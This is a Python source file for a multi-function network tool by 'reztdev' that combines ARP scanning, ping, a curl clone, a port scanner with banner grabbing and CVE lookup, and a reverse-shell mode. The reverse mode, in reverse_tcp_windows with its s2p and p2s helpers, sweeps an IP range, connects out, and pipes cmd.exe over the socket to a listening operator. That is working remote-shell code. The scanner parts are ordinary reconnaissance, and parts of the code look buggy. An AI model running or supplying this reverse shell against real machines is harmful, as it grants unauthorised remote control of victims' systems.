import os
import sys
import ssl
import time
import shutil
import socket
import subprocess
import threading
import argparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

try:
    import requests
    import vulners
    from scapy.all import *
except ImportError as error:
    print(f"[!] ERROR: {error}")
    exit(0)

author = "Muhammad Rizki"
codename = "reztdev"
__version__ = "1.0.0 (LTS)"

# Protocol mapping
protos = {1: "icmp", 6: "tcp", 17: "udp"}

# Extended list of common ports and their services
# You can add to list items
COMMON_PORTS = {
    1: "TCP Port Service Multiplexer (TCPMUX) - Used for multiplexing TCP connections.",
    7: "Echo Protocol - Used to send back any data received, primarily for testing.",
    9: "Discard Protocol - Similar to echo, it ignores any received data.",
    11: "SYSTAT - Used to provide information about the system and users.",
    13: "Daytime Protocol - Used to provide the current date and time.",
    17: "Quote of the Day (QOTD) - Used to provide a random quote.",
    19: "Chargen - Character Generator Protocol, used to generate a stream of characters.",
    20: "FTP (Data Transfer) - Used for transferring files between a client and a server.",
    21: "FTP (Command) - The control connection for FTP.",
    22: "SSH - Secure Shell, provides a secure channel over an unsecured network.",
    23: "Telnet - Unencrypted text communication protocol for remote login.",
    25: "SMTP - Simple Mail Transfer Protocol for sending emails.",
    37: "Time Protocol - Used to synchronize clocks over a network.",
    53: "DNS - Domain Name System for resolving domain names to IP addresses.",
    67: "DHCP (Server) - Used by servers to assign IP addresses to clients.",
    68: "DHCP (Client) - Used by clients to receive configuration from DHCP servers.",
    69: "TFTP - Trivial File Transfer Protocol, a simple file transfer protocol.",
    70: "Gopher - A distributed document search and retrieval protocol.",
    80: "HTTP - HyperText Transfer Protocol for transmitting web pages.",
    81: "HTTP (Alternate) - An alternate port for HTTP traffic.",
    88: "Kerberos - Network authentication protocol for secure communications.",
    110: "POP3 - Post Office Protocol version 3 for retrieving emails.",
    113: "Ident - Identification Protocol for determining the identity of a user.",
    119: "NNTP - Network News Transfer Protocol for reading and posting Usenet articles.",
    123: "NTP - Network Time Protocol for synchronizing clocks.",
    135: "MS RPC - Microsoft Remote Procedure Call.",
    137: "NetBIOS Name Service - Used for NetBIOS over TCP/IP.",
    138: "NetBIOS Datagram Service - Used for NetBIOS over TCP/IP.",
    139: "NetBIOS Session Service - Used for NetBIOS over TCP/IP.",
    143: "IMAP - Internet Message Access Protocol for accessing emails.",
    161: "SNMP - Simple Network Management Protocol for network management.",
    162: "SNMPTRAP - Used for receiving SNMP notifications.",
    179: "BGP - Border Gateway Protocol, used for routing between autonomous systems.",
    194: "IRC - Internet Relay Chat protocol for real-time communication.",
    443: "HTTPS - Secure version of HTTP, used for secure web communication.",
    445: "Microsoft-DS - Used for SMB over TCP/IP.",
    465: "SMTP (SSL) - Secure SMTP connection.",
    487: "SMTP (TLS) - Secure SMTP with STARTTLS.",
    514: "Syslog - Protocol for logging system messages.",
    522: "XMPP - Extensible Messaging and Presence Protocol.",
    543: "Klogin - Kerberos Login Protocol.",
    544: "Kshell - Kerberos Shell Protocol.",
    587: "SMTP (Submission) - Used for submitting emails securely.",
    631: "IPP - Internet Printing Protocol for printing services.",
    993: "IMAP (SSL) - Secure version of IMAP.",
    995: "POP3 (SSL) - Secure version of POP3.",
    1080: "SOCKS Proxy - Used for proxying network traffic.",
    1194: "OpenVPN - Used for OpenVPN connections.",
    1433: "MSSQL - Microsoft SQL Server database service.",
    1434: "MSSQL (UDP) - Used for SQL Server Resolution Service.",
    1723: "PPTP VPN - Point-to-Point Tunneling Protocol.",
    3306: "MySQL - MySQL database service.",
    3389: "RDP - Remote Desktop Protocol for remote access.",
    5060: "SIP - Session Initiation Protocol for multimedia communication.",
    5061: "SIP (TLS) - Secure version of SIP.",
    5432: "PostgreSQL - PostgreSQL database service.",
    5900: "VNC - Virtual Network Computing for remote desktop sharing.",
    6379: "Redis - In-memory data structure store, used as a database.",
    8080: "HTTP Proxy - Alternate port for HTTP traffic.",
    8443: "HTTPS (Alternate) - Alternate port for secure web applications.",
    8888: "HTTP (Alternate) - Another alternate port for HTTP.",
    9000: "PHP-FPM - PHP FastCGI Process Manager.",
    9090: "Webmin - Web-based interface for system administration.",
    9200: "Elasticsearch - RESTful search and analytics engine.",
    9300: "Elasticsearch (Transport) - For inter-node communication in an Elasticsearch cluster.",
    27017: "MongoDB - NoSQL database service.",
}

def read_api_key(file_path="api.key"):
    with open(file_path, "r") as file:
        return file.read().strip()

# Function to check vulnerabilities using Vulners
def check_vulnerabilities(service):
    api_key = read_api_key()
    client = vulners.VulnersApi(api_key=api_key)
    results = client.find_all(service)
    return results


def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

def receiver(conn):
    while True:
        try:
            data = conn.recv(1)
            print(data.decode(), end="", flush=True)
        except:
            print("[!] Server/socket must have died...time to hop off")
            conn.close()
            os._exit(0)

def sender(conn):
    while True:
        mycmd = input("")
        mycmd = mycmd + "\n"
        try:
            conn.send(mycmd.encode())
        except:
            print("[!] Server/socket must have died...time to hop off")
            conn.close()
            os._exit(0)

def scan(target, interface):
    warnings.filterwarnings("ignore")
    try:
        conf.verb = 0
        print("[*] Scanning host ..")

        arp = ARP(pdst=target)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp

        result = srp(packet, timeout=3, verbose=0, iface=interface)[0]

        clients = []
        for sent, received in result:
            clients.append({'ip': received.psrc, 'mac': received.hwsrc})
            reply = sr1(IP(dst=received.psrc) / ICMP(), timeout=1, verbose=0)
            if reply:
                if reply.ttl <= 64:
                    os = "Linux/Unix"
                else:
                    os = "Windows"
                clients[-1]['os'] = os
            else:
                clients[-1]['os'] = "Unknown"

        print("[*] Scanning completed.\n")
        time.sleep(0.8)
        print("\tAvailable devices")
        print("\t-----------------")
        print("\tIP" + " "*18 + "MAC" + " "*18 + "OS")
        print("\t--" + " "*18 + "---" + " "*18 + "--")
        for client in clients:
            print("\t{:16}    {:18}   {}".format(client['ip'], client['mac'], client.get('os', 'Unknown')))
        print("\n")
    except PermissionError:
        print("[!] Root privileges required to run.")

def ensure_scheme(url):
    if not url.startswith(('http://', 'https://')):
        print(f"[!] No scheme supplied. Assuming 'http://' for {url}")
        return 'http://' + url
    return url

def fetch_url(url, method='GET', headers=None, data=None, output_file=None, show_headers=True, show_body=True):
    try:
        response = requests.request(method, url, headers=headers, data=data)
        response.raise_for_status() 
    except requests.exceptions.SSLError as ssl_err:
        print(f"[!] Error occurred (HTTPS): {ssl_err}")
        return
    except requests.exceptions.HTTPError as http_err:
        print(f"[!] HTTP error occurred: {http_err}")
        return
    except Exception as err:
        print(f"[!] An error occurred: {err}")
        return

    if show_headers:
        print(f"[*] Status Code: {response.status_code}")
        print("[+] Response Headers:")
        for key, value in response.headers.items():
            print(f"{key}: {value}")

    if show_body:
        if output_file:
            with open(output_file, 'wb') as f:
                f.write(response.content)
            print(f"[*] Content written to {output_file}")
        else:
            print("\n[+] Response Content:")
            print(response.text)

def print_ip_header(ip_packet):
    ihl = ip_packet.ihl
    tos = ip_packet.tos
    length = ip_packet.len
    identifier = ip_packet.id
    flags = ip_packet.flags
    protocol = protos.get(ip_packet.proto, ip_packet.proto)
    chksum = hex(ip_packet.chksum)
    print(f"IP Header: ihl={ihl}, tos={hex(tos)}, len={length}, id={identifier}, flags={flags}, proto={protocol}, chksum={chksum}")

def ping(host, ttl=20, count=5, payload=None, verbose=False, protocol='icmp'):
    try:
        sent_packets = 0
        received_packets = 0
        min_rtt = float('inf')
        max_rtt = float('-inf')
        total_rtt = 0
        packet_loss = 0

        for i in range(1, count+1):
            if protocol == 'icmp':
                packet = IP(dst=host, ttl=ttl)/ICMP()/Raw(load=payload)
            elif protocol == 'tcp':
                packet = IP(dst=host, ttl=ttl)/TCP()/Raw(load=payload)
            elif protocol == 'udp':
                packet = IP(dst=host, ttl=ttl)/UDP()/Raw(load=payload)
            else:
                print("Invalid protocol specified. Supported protocol: icmp, tcp, udp.")
                return

            start_time = time.time()
            reply = sr1(packet, timeout=2, verbose=0)
            end_time = time.time()
            if reply:
                times = (end_time - start_time) * 100
                print(f"{len(reply)} bytes {host} ({reply.src}) {protocol.upper()}_seq={i} ttl={reply.ttl} payload={packet[Raw].load} time={times:.2f} ms ")
                received_packets += 1
                min_rtt = min(min_rtt, times)
                max_rtt = max(max_rtt, times)
                total_rtt += times
                if verbose:
                    print_ip_header(reply)
                    print("Hex Data:")
                    hexdump(reply)
                    print("")
            else:
                print(f"{host} Request timed out {protocol.upper()}_seq={i}")
        
            sent_packets += 1
            time.sleep(1)
        
        packet_loss = (sent_packets - received_packets) / sent_packets * 100
        print(f"\n--- Ping statistics {host} ---:")
        print(f"  Packets: Sent = {sent_packets}, Received = {received_packets}, Lost = {sent_packets-received_packets} ({packet_loss:.0f}% loss)")
        if received_packets > 0:
            avg_rtt = total_rtt / received_packets
            print("--- Approximate round trip times in milli-seconds ---:")
            print(f"  Minimum = {min_rtt:.2f}ms, Maximum = {max_rtt:.2f}ms, Average = {avg_rtt:.2f}ms")

    except KeyboardInterrupt:
        print(f"\n--- {protocol.upper()} Ping statistics for {host} ---:")
        print(f"  Packets: Sent = {count}, Received = {received_packets}, Lost = {count-received_packets} ({packet_loss:.0f}% loss)")
    except socket.gaierror:
        print("No internet connection")
    except PermissionError:
        print("Operation not permitted (as Root/Admin)")

# Function to get the service name for a port
def get_service(port):
    return COMMON_PORTS.get(port, "Unknown service")

# WAF detection function
def detect_waf(url):
    try:
        response = requests.get(url, timeout=5)
        waf_detected = False

        # Check common WAF headers or response behaviors
        if 'Server' in response.headers:
            server_header = response.headers['Server'].lower()
            if 'cloudflare' in server_header:
                print("[+] Detected Cloudflare WAF")
                waf_detected = True
            elif 'sucuri' in server_header:
                print("[+] Detected Sucuri WAF")
                waf_detected = True

        if response.status_code == 403:
            print("[?] WAF likely detected due to 403 Forbidden response")
            waf_detected = True

        if waf_detected:
            print("[+] WAF detected on target.")
        else:
            print("[?] No WAF detected.")
    except requests.RequestException as e:
        print(f"[!] WAF detection failed: {str(e)}")

# OS detection function (ICMP-based for simplicity)
def detect_os(ip):
    try:
        ping = sr1(IP(dst=ip)/ICMP(), timeout=1, verbose=0)
        if ping:
            ttl = ping.ttl
            if ttl <= 64:
                return "Linux/Unix"
            elif ttl <= 128:
                return "Windows"
            else:
                return "Unknown"
        else:
            return "Unknown"
    except Exception as e:
        print(f"[!] Error detecting OS: {e}")
        return "Unknown"

# More detailed OS detection (using TCP handshake fingerprinting)
def detect_detailed_os(target, port):
    try:
        syn = IP(dst=target)/TCP(dport=port, flags='S')
        syn_ack = sr1(syn, timeout=2, verbose=0)
        if syn_ack:
            ttl = syn_ack.ttl
            window_size = syn_ack[TCP].window
            if ttl == 64 and window_size == 29200:
                return "Linux 4.x/5.x (likely)"
            elif ttl == 128 and window_size == 8192:
                return "Windows Server 2016/2019"
            else:
                return "Unknown OS version"
        else:
            return "Unknown OS"
    except Exception as e:
        print(f"[!] Error detecting detailed OS: {e}")
        return "Unknown OS"

# Function to grab banner
def grab_banner(target_ip, port):
    try:
        if port == 443:
            context = ssl.create_default_context()
            with socket.create_connection((target_ip, port), timeout=2) as sock:
                with context.wrap_socket(sock, server_hostname=target_ip) as ssock:
                    request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
                    ssock.sendall(request.encode())
                    response = ssock.recv(4096).decode().strip()
                    return response
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target_ip, port))
            banner = s.recv(1024).decode().strip()
            s.close()
            return banner
    except Exception:
        return None

# Function to check SSL/TLS details
def check_ssl_certificate(target_ip, port):
    context = ssl.create_default_context()
    try:
        with socket.create_connection((target_ip, port)) as sock:
            with context.wrap_socket(sock, server_hostname=target_ip) as ssock:
                cert = ssock.getpeercert()
                return cert
    except Exception as e:
        print(f"[!] SSL error: {e}")
        return None

# Function to scan a single port and check for vulnerabilities
def scan_port(target, port, timeout=1):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((target, port))
        
        if result == 0:
            service = get_service(port)
            print(f"[+] Port {port} is open ({service})")
            
            if port == 443:
                cert = check_ssl_certificate(target, port)
                if cert:
                    print("    [+] SSL Certificate Information:")
                    print(f"        Issuer: {cert['issuer']}")
                    print(f"        Subject: {cert['subject']}")
                else:
                    print("    [!] No SSL certificate information available.")
            else:
                banner = grab_banner(target, port)
                if banner:
                    print(f"    [+] Banner: {banner}")
            
            # Check for vulnerabilities based on service
            vulnerabilities = check_vulnerabilities(service)
            if vulnerabilities:
                print("    [+] Vulnerabilities Detected:")
                for vulnerability in vulnerabilities:
                    vuln_type = vulnerability.get('type', 'N/A')
                    cve_id = vulnerability.get('id', 'N/A')
                    link = vulnerability.get('link', 'N/A')
                    print(f"        - Type: {vuln_type}, CVE: {cve_id}, Link: {link}")
            else:
                print("    [?] No known vulnerabilities detected.")
        s.close()
    except Exception as e:
        print(f"[!] Error scanning port {port}: {str(e)}")


# Function to scan multiple ports using threading
def scan_ports(target, ports, timeout=1):
    print(f"[..] Starting port scan on {target}")
    
    try:
        target_ip = socket.gethostbyname(target)
        print(f"[*] Target IP: {target_ip}")
    except socket.gaierror:
        print(f"[!] Could not resolve hostname: {target}")
        return

    print(f"[..] Scanning started at {datetime.now()}\n")
    
    # Perform OS detection before scanning ports
    os_basic = detect_os(target_ip)
    os_detailed = detect_detailed_os(target_ip, ports)
    print(f"[*] OS Detected (basic): {os_basic}")
    print(f"[*] OS Detected (detailed): {os_detailed}")

    # Perform port scanning
    with ThreadPoolExecutor(max_workers=10) as executor:
        for port in ports:
            executor.submit(scan_port, target_ip, port, timeout)

    # Perform WAF detection after scanning
    url = f"http://{target}"  # Assuming HTTP for WAF detection
    detect_waf(url)

    print(f"\n[+] Scanning completed at {datetime.now()}")


def create_socket():
    return socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
def reverse_tcp_windows(ip_range_start, ip_range_end, port, base_ip, execute):
    connected = False
    while True:
        for i in range(int(ip_range_start), int(ip_range_end) + 1):
            ip = f'{base_ip}.{i}'
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.settimeout(2)
                s.settimeout(None)
                connected = True
                print(f"[+] Connected {ip}")
                
                # Mencari path executable di PATH
                execute_path = shutil.which(execute)
                if not execute_path:
                    print(f"[!] Executable {execute} not found in PATH.")
                    continue
                
                x = subprocess.Popen([execute_path], stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
                _s2p = threading.Thread(target=s2p, args=[s, x])
                _s2p.daemon = True
                _s2p.start()
                _p2s = threading.Thread(target=p2s, args=[s, x])
                _p2s.daemon = True
                _p2s.start()
                try:
                    x.wait()
                except KeyboardInterrupt:
                    s.close()
                    sys.exit()
            except socket.error as er:
                print(f"{ip} Connection Timeout!!")
                time.sleep(1)

def main():
    parser = argparse.ArgumentParser(
        description="Netcat with Multi functionality",
        formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=85, width=90)
    )
    parser.add_argument("--version", action="version", version=f"Version: %(prog)s {__version__} by {codename}",
                        help="Show the version of the program")
    subparsers = parser.add_subparsers(dest="mode", help="Choose between for you like")

    reverse_parser = subparsers.add_parser("reverse", help="Reverse Shell TCP similar to netcat", formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=85, width=85))
    reverse_parser.add_argument("-i", "--ip", type=str, default="0.0.0.0", help="IP address to bind (default: 0.0.0.0)")
    reverse_parser.add_argument("-p", "--port", type=int, required=True, help="Port number to bind")
    reverse_parser.add_argument("--ip-range-start", type=int, help="Start of IP range for reverse TCP")
    reverse_parser.add_argument("--ip-range-end", type=int, help="End of IP range for reverse TCP")
    reverse_parser.add_argument("--base-ip", type=str, default="192.168.18", help="Base IP for reverse TCP (default: 192.168.18)")
    reverse_parser.add_argument("-e", "--execute", type=str, default="cmd.exe", help="Executable to run (default: cmd.exe)")

    ping_parser = subparsers.add_parser("ping", help="Ping with support protocol ICMP, TCP, UDP", formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=85, width=85))
    ping_parser.add_argument("--host", type=str, required=True, help="Target host to ping")
    ping_parser.add_argument("--ttl", type=int, default=20, help="Time-to-live (TTL) for ping (default: 20)")
    ping_parser.add_argument("--count", type=int, default=5, help="Number of ping requests to send (default: 5)")
    ping_parser.add_argument("--payload", type=str, default=None, help="Custom payload to send in ping")
    ping_parser.add_argument("--verbose", action="store_true", help="Enable verbose output for ping")
    ping_parser.add_argument("--protocol", type=str, choices=['icmp', 'tcp', 'udp'], default='icmp', help="Protocol to use for ping (default: icmp)")

    scan_parser = subparsers.add_parser("scan", help="ARP Scan on local network", formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=85, width=85))
    scan_parser.add_argument("-t", "--target", required=True, help="Target IP address range (e.g., 192.168.1.0/24)")
    scan_parser.add_argument("-i", "--iface", help="Interface to use (default: 'conf.iface')")

    curl_parser = subparsers.add_parser('curl', help='HTTP/HTTPS request similar to curl')
    curl_parser.add_argument('url', help="The URL to fetch (HTTP or HTTPS)")
    curl_parser.add_argument('-X', '--request', help="Specify request method (e.g., GET, POST)", default='GET')
    curl_parser.add_argument('-H', '--header', action='append', help="Pass custom header(s) to server (e.g., 'User-Agent: my-app')")
    curl_parser.add_argument('-d', '--data', help="Send POST data")
    curl_parser.add_argument('-o', '--output', help="Write output to <file> instead of stdout")
    curl_parser.add_argument('--headers-only', action='store_true', help="Only show response headers")
    curl_parser.add_argument('--body-only', action='store_true', help="Only show response body")

    port_parser = subparsers.add_parser("scanport", help="Port Scanner with Banner Grabbing, SSL Check, WAF, OS Detection dan Vulnerabilities", formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=85, width=85))
    port_parser.add_argument("-t", "--target", required=True, help="Target hostname or IP to scan")
    port_parser.add_argument('-sp', '--start-port', type=int, help='Start of the port range (e.g., 20)')
    port_parser.add_argument('-ep', '--end-port', type=int, help='End of the port range (e.g., 80)')
    port_parser.add_argument('-p', '--ports', type=int, help='Specific ports to scan (e.g., 22 80 443)')
    port_parser.add_argument('-tm', '--timeout', type=int, default=1, help='Timeout for each port scan (in seconds, default: 1)')

    args = parser.parse_args()

    if args.mode == "reverse":
        if args.ip_range_start and args.ip_range_end:
            reverse_tcp_windows(args.ip_range_start, args.ip_range_end, args.port, args.base_ip, args.execute)
        else:
            host = args.ip if args.ip else "0.0.0.0"  # Default to listening on all interfaces if base_ip is not provided
            port = args.port

            # Create a socket with the specified protocol
            s = create_socket()
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((host, port))

            s.listen(5)
            print(f"\n[*] Listening on {host}:{port}")
            conn, addr = s.accept()
            print(f'[*] Accepted new connection from: {addr[0]}:{addr[1]}\n')

            # Start threads for sending and receiving data
            threading.Thread(target=receiver, args=[conn], daemon=True).start()
            threading.Thread(target=sender, args=[conn], daemon=True).start()

            while True:
                time.sleep(1)

    elif args.mode == "ping":
        ping(args.host, ttl=args.ttl, count=args.count, payload=args.payload, verbose=args.verbose, protocol=args.protocol)

    elif args.mode == "scan":
        interface = args.iface if args.iface else conf.iface
        scan(args.target, interface)
    
    elif args.mode == 'curl':
        url = ensure_scheme(args.url)
        headers = {}
        if args.header:
            for header in args.header:
                key, value = header.split(':', 1)
                headers[key.strip()] = value.strip()

        show_headers = not args.body_only
        show_body = not args.headers_only

        fetch_url(url, method=args.request, headers=headers, data=args.data, output_file=args.output, show_headers=show_headers, show_body=show_body)
    
    elif args.mode == "scanport":
        if args.ports:
            ports = args.ports
        elif args.start_port and args.end_port:
            ports = range(args.start_port, args.end_port + 1)
        else:
            ports = list(COMMON_PORTS)
        scan_ports(args.target, ports, args.timeout)
    
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
